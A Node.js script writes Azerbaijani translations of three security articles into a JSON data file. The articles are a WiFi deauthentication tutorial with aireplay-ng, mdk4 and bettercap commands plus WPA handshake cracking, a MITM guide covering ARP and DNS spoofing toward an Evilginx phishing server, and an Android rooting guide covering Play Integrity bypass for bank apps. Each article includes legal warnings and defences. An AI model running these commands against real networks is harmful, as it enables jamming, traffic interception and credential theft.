// Apply AZ translations: art-17, art-18, art-19
const fs = require('fs');
const path = require('path');
const FILE = path.join(__dirname, 'data', 'articles.json');

const TR = {
  'art-17': `# Deauth-hücumlar: WiFi-dan necə atırlar

Deauthentication-hücum — bir komanda ilə radius daxilindəki bütün cihazlar **WiFi-dan atılır**. Hücumun qarşısı heç bir parolla alına bilməz — o, 802.11 protokol səviyyəsində işləyir. Yeganə müdafiə — PMF (Protected Management Frames) ilə WPA3-dür.

::warn Yalnız öz şəbəkələrində tətbiq et. WiFi-nin susdurulması — rabitə şəbəkələrinin işinin pozulması maddəsidir.

## 1. Necə işləyir

802.11 standartında **idarəetmə** kadrları (management frames) var — defolt olaraq onlar şifrələnmir. Onlardan biri — **Deauthentication** — klient və ya router əlaqəni kəsmək istədikdə göndərilir.

Problem: **heç kim imzanı yoxlamır**. İstənilən şəxs router adından klientə (və ya əksinə) belə kadr göndərə bilər — və sessiya kəsiləcək.

\`\`\`
Hücum edən → [router MAC-ından Deauth frame] → Klient
Klient: "router məni atmaq istəyir" → ayrılır
\`\`\`

Hər 100ms-də təkrar et — klient **heç vaxt geri qoşula bilməz**.

## 2. Hücum edənə bu nə üçün lazımdır

- **Handshake-in tutulması** — klient yenidən qoşulanda WPA2 handshake-i tutmaq üçün hashcat ilə offline brute
- **Rəqiblərin atılması** — kanalı azad etmək
- **MITM tutumu** — klient sənin saxta nöqtənə düşür (Evil Twin)
- **Sadəcə DoS** — şəbəkəni susdurmaq

## 3. Nə lazımdır

::tip WPS üçün eyni quraşdırma — Kali + monitor mode adapter (Alfa AWUS036ACH idealdır).

\`\`\`bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
\`\`\`

Hədəfin BSSID-i və kanalı yadda saxlayırsan. Sonra konkret şəbəkəyə fokus:

\`\`\`bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
\`\`\`

Solda qoşulu klientləri görəcəksən (onların MAC-ı).

## 4. Aireplay-ng — klassika

\`\`\`bash
# Hamını nöqtədən atmaq
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Konkret klienti atmaq
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
\`\`\`

- \`--deauth 0\` — sonsuz axın (rəqəm — neçə kadr)
- \`-a\` — router-in BSSID-i
- \`-c\` — klientin MAC-ı (göstərilməyibsə — hamısına)

::github aircrack-ng/aircrack-ng | aircrack-ng — WiFi alətlərinin standartı

## 5. mdk4 — kütləvi deauth

mdk4 daha ağıllıdır: kadrları daha sürətli göndərir, fasiləsiz rejim dəstəkləyir, siyahı üzrə hədəfləmə daha sadədir.

\`\`\`bash
# 6 kanalında radius daxilində hamıya deauth
sudo mdk4 wlan0mon d -c 6
\`\`\`

::github aircrack-ng/mdk4 | mdk4 — WiFi-nin kütləvi stress-testi

::warn mdk4 saniyədə 150+ kadr atır — bu radiusdakı **hər şeyi** susdurur, təkcə bir şəbəkəni yox. Qonşular, nənən, parkinq kameraları — hər şey yıxılacaq.

## 6. WifiJammer / Bettercap

Skript avtomatlaşdırması üçün:

::github DanMcInerney/wifijammer | wifijammer — Python skript, görünən bütün şəbəkələrə avto-deauth
::github bettercap/bettercap | bettercap — MITM üçün İsveçrə bıçağı, deauth daxil olmaqla

\`\`\`bash
# bettercap
sudo bettercap -iface wlan0mon
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF
\`\`\`

## 7. Handshake tutumu ilə birləşmə

Deauth-un əsas məqsədi — offline brute üçün **WPA handshake** tutmaqdır:

\`\`\`bash
# Terminal 1 — qulaq asırıq
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2 — təpik atırıq
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
\`\`\`

Birinci terminalın yuxarı sağ küncündə \`[WPA handshake: AA:BB:CC...]\` görünəcək — handshake tutuldu. Sonra:

\`\`\`bash
# Çevirmə
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# hashcat ilə brute
hashcat -m 22000 hash.hc22000 rockyou.txt
\`\`\`

hashcat haqqında daha ətraflı — [burada](/article/art-15).

## 8. Deauth-dan necə müdafiə olunmalı

::tip Yeganə real müdafiə — PMF (Protected Management Frames) ilə WPA3.

### WPA3 (Wi-Fi Protected Access 3)
- **Management frames**-i kriptoqrafik imza ilə qoruyur
- Yanlış imzalı deauth-kadrlar **ignor edilir**
- Router admin panelində aktivləşdir: WiFi → Security → WPA3-Personal və ya WPA2/WPA3 Mixed

### WPA3 yoxdursa (köhnə router)
- **802.11w (Management Frame Protection)**-u aktivləşdir — bəzi WPA2 router-ləri opsional dəstəkləyir
- Gizli SSID və MAC filtrasiya — deauth-a qarşı **faydasız**, narahat olma
- **WPA3-routeri al** — 2026-da 30$-dan başlayır

### Monitorinq
- Router-də **wireless IDS** (WIDS) işə sal — şübhəli deauth-axınları log edir
- Klientlərdə — Wireshark / airodump-ng → saniyədə >10 deauth görürsənsə, sənə hücum edirlər

## 9. Niyə 2026-da deauth — demək olar faydasız

Müasir smartfonlar (iPhone 12+, Pixel 6+, Galaxy S22+) **WPA3** və **PMF** bacarır. Belə klientlərdə deauth-hücum **uğursuz olur** — kadrlar ignor edilir.

2018-2020-də deauth hamı üçün işləyirdi. 2026-da — yalnız WPA3 olmayan köhnə cihazlar və router-lər üçün.

::warn Amma 2026-da Azərbaycanda/Rusiyada ev şəbəkələrinin 60%-i hələ də PMF-siz WPA2-dədir — orada hücum işləyir.

## Yekun

Deauth — qədim hücumdur, amma PMF-siz WPA2 olduğu müddətcə hələ də aktualdır. **İstifadəçi səviyyəsində** həll yolu birdir: WPA3-routeri. Alternativ yoxdur.

::warn Bütün nümunələr — anlamaq və **öz** şəbəkələrini test etmək üçündür. Yad şəbəkələrdə — AR CM-nin maddəsi.`,

  'art-18': `# 2026-da MITM: Bettercap + sslstrip — trafiki necə tuturlar

MITM (Man-In-The-Middle) — sənin trafikin hücum edənin maşını üzərindən gedən klassik hücumdur. 2010-larda parolları açıq oxumaq olardı. 2026-da — HTTPS hər yerdə, amma MITM **hələ də işləyir** — DNS, metadata və köhnə protokollar üzərindən.

::warn Hücum şəbəkəyə fiziki giriş tələb edir (eyni parollu Wi-Fi, kabel şəbəkə). Yalnız öz şəbəkələrində tətbiq et.

## 1. ARP-spoofing vasitəsilə MITM necə işləyir

Lokal şəbəkədə cihazlar bir-birini **ARP** (Address Resolution Protocol) vasitəsilə tapır. Hücum edən saxta ARP-cavablar göndərir:

\`\`\`
Hücum edən → qurbana: "router AA:AA:AA:AA:AA:AA MAC-ında" (bu mənim MAC-ımdır)
Hücum edən → router-ə: "qurban AA:AA:AA:AA:AA:AA MAC-ında" (bu mənim MAC-ımdır)
\`\`\`

İndi qurbanın bütün trafiki hücum edən üzərindən keçir, o trafiki sonra ötürür. Qurban heç nə görmür.

## 2. Bettercap — əsas alət

::github bettercap/bettercap | bettercap — MITM/sniffing üçün İsveçrə bıçağı

Kali-də quraşdırma:

\`\`\`bash
sudo apt install bettercap
\`\`\`

İşə salma:

\`\`\`bash
sudo bettercap -iface wlan0
\`\`\`

Shell-də:

\`\`\`
> net.probe on
> net.show
\`\`\`

Şəbəkədəki bütün cihazları görəcəksən. Qurbanı seçirsən:

\`\`\`
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on
\`\`\`

İndi 192.168.1.50-nin bütün trafiki sənin üzərindən gedir.

## 3. 2026-da trafikdə nə görünür

### ✅ HTTPS arxasında belə görünür
- **DNS sorğuları** (DoH/DoT-suzdursa) — \`hansı saytları\` gəzirsən
- TLS handshake-də **SNI** — \`hansı domeni\` istəyirsən (məzmun yox, amma sayt adı)
- **Metadata**: paket ölçüləri, vaxtlar, pattern-lər
- **Təyinat IP-si**

### ❌ Görünmür
- HTTPS sorğularının məzmunu
- Cookie-lər, parollar, formalar
- POST sorğularının məzmunu

::tip TLS 1.3 + Encrypted Client Hello (ECH) 2026-da SNI-ni belə gizlədir. Cloudflare onu qlobal aktivləşdirib — Firefox 118+ və ya Chrome 124+ lazımdır.

## 4. sslstrip — downgrade cəhdi (köhnəlib, amma maraqlı)

2010-larda sslstrip HTML-də \`https://\`-i \`http://\` ilə əvəzləyir və parolları oxuyurdu. 2026-da bu **işləmir** — **HSTS** (HTTP Strict Transport Security) sayəsində: brauzerlər saytın HTTPS gəzdiyini yadda saxlayır və HTTP-ni ignor edirlər.

Amma **HSTS preload-suz yeni saytlarda** ilk ziyarətdə — hələ də mümkündür:

\`\`\`
> set http.proxy.sslstrip true
> http.proxy on
\`\`\`

::warn Əhəmiyyətli saytların 99%-i HSTS preload list-dədir. sslstrip yalnız kiçik özəl saytlarda nəticə verir.

## 5. DNS-spoofing — 2026-nın əsas silahı

HTTPS məzmun əlçatmaz olduğundan, 2026-da MITM — **DNS-in dəyişdirilməsidir**:

\`\`\`
> set dns.spoof.domains *.gmail.com,*.bank.com
> set dns.spoof.address 1.2.3.4    # sənin saxta server-inin IP-si
> dns.spoof on
\`\`\`

Qurban \`gmail.com\` daxil edir → sənin server-inə düşür (orada Evilginx phishing işləyir).

::tip 2026-nın ən güclü birləşməsi: Bettercap (MITM + DNS spoof) → Evilginx (phishing proxy) → session cookie-lərin tutulması. Wi-Fi-dan hesabın oğurlanmasına qədər tam zəncir.

::github kgretzky/evilginx2 | Evilginx (phishing məqaləsinə bax)

## 6. Caplets — hazır ssenarilər

Bettercap **caplets**-i dəstəkləyir — avtomatlaşdırma skriptləri:

\`\`\`bash
sudo bettercap -caplet http-req-dump
\`\`\`

::github bettercap/caplets | Hazır caplets kataloqu: hstshijack, beef-active, password sniff

Ən məşhuru — \`hstshijack\`:

\`\`\`
sudo bettercap -caplet hstshijack/hstshijack
\`\`\`

Domenləri oxşarlarına dəyişməklə HSTS-i keçməyə çalışır (\`gmail.com\` → fərqli TLD-li \`gmaii.com\`).

## 7. Bettercap alternativləri

::github SySS-Research/Seth | Seth — RDP üçün MITM (Windows Remote Desktop)
::github lgandx/Responder | Responder — Windows-şəbəkələri üçün, LLMNR/NBT-NS zəhərlənməsi
::github Arszilla/ettercap | ettercap-NG — köhnə, amma hələ də işləyir

## 8. SSL-sertifikatın saxtalaşdırılması (CA pinning bypass)

Qurbanın cihazına **fiziki giriş** varsa:

1. Qurbanın cihazına öz CA-sertifikatını quraşdır (Settings → Security → Install certificate)
2. mitmproxy işə sal → cihazın bütün HTTPS-i açıq görür

::github mitmproxy/mitmproxy | mitmproxy — debug üçün HTTPS interpretasiyası

::warn Qurbanda CA quraşdırılmadan — HTTPS deşifrə olunmur. "Təmiz" cihazda istənilən mitmproxy certificate warning verəcək və brauzer bloklayacaq.

## 9. MITM-dən necə qorunmalı

::warn İctimai WiFi-dasansa (kafe, hava limanı) — potensial MITM altındasan. Müdafiə:

1. **Həmişə VPN** — MITM olsa belə, yalnız VPN-server-ə getdiyin görünəcək. Məzmun ikinci qatla qorunur.
2. **HTTPS-only mode** brauzerdə (Chrome/Firefox/Brave parametri) — bütün HTTP-yükləmələri bloklayır.
3. **DNS over HTTPS** (DoH) və ya **DoT** — Cloudflare \`1.1.1.1\`, NextDNS. Hücum edən DNS-i görmür.
4. **HSTS preload** — bütün normal saytlar artıq preload list-dədir, sslstrip işləmir.
5. **Heç vaxt certificate warning-i ignor etmə** — bu 99% halda MITM cəhdidir.

::download https://1.1.1.1/ | Cloudflare 1.1.1.1 — pulsuz DNS over HTTPS

### Router üçün
- **Dynamic ARP Inspection (DAI)** — korporativ router-lər bacarır, məişət — nadir hallarda
- WiFi-da **WPA3** — klientlər fərdi açarlar alır, havada ARP-spoof işləmir
- Qonaq şəbəkəsi üçün **VLAN izolyasiyası**

## 10. Niyə 2026-da MITM — niş hücumdur

- **HTTPS hər yerdə** (brauzerlərdə trafikin 97%-i) → məzmun qorunur
- **HSTS preload** → sslstrip işləmir
- **ECH (Encrypted Client Hello)** → SNI belə gizlidir
- **DoH/DoT** → DNS şifrələnib
- Paranoidlərdə **VPN** → əlavə qat

MITM **canlıdır**, amma təmiz formada az şey verir. DNS → phishing → 2FA bypass hücumları üçün **birinci mərhələ** kimi istifadə olunur.

## Yekun

2026-da MITM — "Starbucks-da parolları oxumaq" deyil. Bu — DNS-spoofing + Evilginx vasitəsilə phishing-ə **pre­lyudiyadır**. Müdafiə: VPN + DoH + həmişə HTTPS + sertifikat xətalarını ignor etmə.

::warn Yalnız öz şəbəkələrində tətbiq et. Yad şəbəkədə ARP-spoofing = AR CM-nin 271-1 maddəsi.`,

  'art-19': `# Android root 2026-da: Magisk vs KernelSU vs APatch

2026-cı ildə root — 2015-dəki kimi deyil. Google **Play Integrity API** (keçmiş SafetyNet) ilə vidaları sıxıb, bank tətbiqləri işləməkdən imtina edir. Amma root hələ də realdır, sadəcə düzgün alətlər lazımdır.

::warn Root cihazı zəif edir. Bunu bankların olduğu əsas telefonda etmə. Daha yaxşı — modlar üçün ayrıca cihaz.

## 1. 2026-da root niyə lazımdır

Köhnə səbəblər (reklam blokları, backup) artıq lazım deyil — AdGuard və Google Backup var. Müasir hallar:

- Sistem rejimində **AdGuard Pro** (VPN-xidmət səviyyəsində filtr)
- **App freezer** (sistem zibilini silmədən dondurma)
- **Magisk modulları** (qaranlıq mövzular, kastom şriftlər, audio modlar)
- **Kastom ROM-lar** (LineageOS, GrapheneOS) — modlar üçün tez-tez root tələb edir
- **Reverse engineering** — tətbiqlərin təhlili, frida/objection
- İstehsalçının **dayatma tətbiqlərinin silinməsi** (Samsung Bloatware, MIUI ads)

## 2. 2026-da üç alət

2026-cı ildə root almaq üçün üç yol aktualdır:

| Alət | Prinsip | Üstünlüklər | Çatışmazlıqlar |
|---|---|---|---|
| **Magisk** | boot.img vasitəsilə systemless | Ən yetkin, çoxlu modul | Play Integrity çətin keçilir |
| **KernelSU** | ядро dəyişdirilməsi vasitəsilə | Ən yaxşı gizlənir | Uyğun ядро lazımdır |
| **APatch** | rantaymda ядро yamağı | boot.img lazım deyil | Cavan, az modul |

::github topjohnwu/Magisk | Magisk — Android root-un qızıl standartı
::github tiann/KernelSU | KernelSU — ядро vasitəsilə root, ən yaxşı gizlənmə
::github bmax121/APatch | APatch — rantaym ядро yaması ilə root

## 3. Magisk — klassika

**Magisk** — ən populyarı. boot.img-in dəyişdirilməsi ilə işləyir.

### Quraşdırma (ümumi proses)

1. **Bootloader-i açmaq** (istehsalçıdan asılı)
2. Öz proşivkan üçün **stock boot.img** yüklə
3. Magisk app quraşdır:

::download https://github.com/topjohnwu/Magisk/releases | Magisk APK endir

4. Tətbiqdə → "Patch boot.img" → faylı seç
5. fastboot ilə proşi:

\`\`\`bash
fastboot flash boot magisk_patched.img
fastboot reboot
\`\`\`

### Modullar

Root-dan sonra → Magisk → Modules. 2026-da topdakılar:

- **LSPosed** — Xposed framework, istənilən tətbiqin dəyişdirilməsi
- **AFWall+** — qabaqcıl firewall
- **Universal SafetyNet Fix** (USNF) — Play Integrity-dən yan keçmə (aşağıya bax)
- **Shamiko** — root-un tətbiqlərdən qabaqcıl gizlədilməsi

::github LSPosed/LSPosed | LSPosed — müasir Android üçün Xposed
::github LSPosed/LSPlant | LSPlant — hooking mühərrikinin əsası

## 4. KernelSU — gizlənmənin vacib olduğu hallarda

**KernelSU** ядро dəyişdirilməsi ilə işləyir, systemless deyil. Üstünlükləri:

- **Ядро daxilində** root — tətbiqlər standart üsullarla aşkarlaya bilmir
- Magisk app lazım deyil — KernelSU manager ilə idarə
- Su binary /system-də görünmür

### Tələblər
- Uyğun ядро (tez-tez kastom — məsələn, açıq mənbəli OnePlus)
- Android 11+

::github tiann/KernelSU | KernelSU + uyğun cihazların siyahısı

::tip Pixel-in varsa — KernelSU + GrapheneOS **çox** təmiz root verir, maksimal gizlənmə ilə.

## 5. Play Integrity bypass — 2026-nın əsas problemi

Google **Play Integrity API** yoxlayır:
- BASIC (Android cihazıdır) — keçilir
- DEVICE (sistem bütövlüyü) — çətinliklə keçilir
- STRONG (hardware-attested) — **demək olar keçilməz**

Bankların əksəriyyəti MEETS_DEVICE_INTEGRITY (DEVICE) tələb edir.

### 2026-da nə işləyir

::github chiteroman/PlayIntegrityFork | PlayIntegrityFork — bypass üçün ən yaxşı Magisk-modul

Quraşdırma:
1. Magisk → quraşdırılıb və işləyir
2. PlayIntegrityFork modulunu yüklə → Magisk vasitəsilə flash et
3. \`Shamiko\` modul → maliyyə tətbiqləri üçün DenyList
4. Magisk → Settings → \`Enforce DenyList\` ON
5. DenyList-ə **bütün** bank/dövlət tətbiqlərini əlavə et

::github LSPosed/LSPosed-MetaNeedle | MetaNeedle — bəzi yoxlamaların keçilməsi

::warn Bank tətbiqləri detect-i daim yeniləyir. Bu gün işləyən şey bir həftəyə işləməyə bilər.

## 6. Bootloader unlock — başlanğıc nöqtəsi

Açılmamış bootloader-lə root **mümkün deyil**.

| İstehsalçı | Açılış | Çətinlik |
|---|---|---|
| **Pixel** | \`fastboot flashing unlock\` | Trivial |
| **OnePlus** | Saytda hesab → token | Asan |
| **Xiaomi** | Mi Unlock Tool, 7-30 gün gözləmə | Orta |
| **Samsung** | Yalnız OEM versiyalarında, US/CN bloklanıb | Modeldən asılıdır |
| **Huawei** | 2018-dən sonra demək olar mümkünsüz | Mümkünsüz |

::download https://flashing-tool.netlify.app/ | Açılış üzrə universal təlimat

## 7. Daxili root-lu kastom ROM-lar

Alternativ: Magisk vasitəsilə root əvəzinə — kastom proşivka qoymaq.

::download https://lineageos.org/ | LineageOS — 200+ cihaz üçün açıq mənbəli Android
::download https://grapheneos.org/ | GrapheneOS — məxfilik + təhlükəsizlik (yalnız Pixel)
::download https://e.foundation/ | /e/OS — degoogled Android

::tip GrapheneOS — ən təhlükəsiz variant. Pixel + GrapheneOS + Magisk-KernelSU-vasitəsilə = yanmayan kirpi.

## 8. Root-dan SONRA nə etməli

1. **VPN rejimində AdGuard** — bütün tətbiqlərdə sistem reklam bloku
2. **AFWall+** — tətbiq səviyyəsində firewall
3. **LSPosed + modullar**: HideMyApplist, XPrivacyLua
4. **Backup**: TWRP / OrangeFox recovery, Swift Backup, Migrate
5. **Şifrələnmə** root zamanı itmir (defolt aktivdir)

::github GrapheneOS/Auditor | Auditor — öz cihazının bütövlüyünün yoxlanılması

## 9. Root-dan sonra NƏ ETMƏMƏLİ

::warn Ciddi xəbərdarlıqlar:

- **Əsas bank üçün root istifadə etmə** — bypass işləsə də, kompromat riski var
- **Anlaşılmaz mənbələrdən modul qoyma** — root = hər şeyə giriş
- **Tanımadığın root-ToS-larda parol daxil etmə** — adətən tələdir
- **Magisk/KernelSU-nu yalnız** GitHub-dakı rəsmi repo-dan al

## 10. Alternativ: shizuku (root-suz root)

Root qorxuludursa, amma imtiyazlar lazımdırsa — **Shizuku**:

::github RikkaApps/Shizuku | Shizuku — tam root-suz tətbiqlər üçün ADB-imtiyazları

USB-ADB ilə bir dəfə işə salınır, ondan sonra tətbiqlər root-suz sistem hüquqları alır. Az imkan, amma az risk.

## Yekun

2026-da root canlıdır, amma bilik tələb edir:

1. **Pixel** + **Magisk** + **PlayIntegrityFork** + **Shamiko** — imkan və stelsin balansı
2. **Pixel** + **GrapheneOS** + **KernelSU** — maksimum məxfilik lazımdırsa
3. **Shizuku** — sadəcə konkret tətbiqlər üçün sistem hüquqları lazımdırsa

::warn Bootloader unlock bütün məlumatları silir. Başlamazdan əvvəl backup et.`,
};

const data = JSON.parse(fs.readFileSync(FILE, 'utf8'));
let upd = 0;
for (const [id, az] of Object.entries(TR)) {
  const it = data.items.find((x) => x.id === id);
  if (!it) { console.log('SKIP missing', id); continue; }
  it.content_az = az;
  upd++;
  console.log(`OK ${id}: ${az.length} chars`);
}
fs.writeFileSync(FILE, JSON.stringify(data, null, 2), 'utf8');
console.log(`Updated ${upd} articles`);
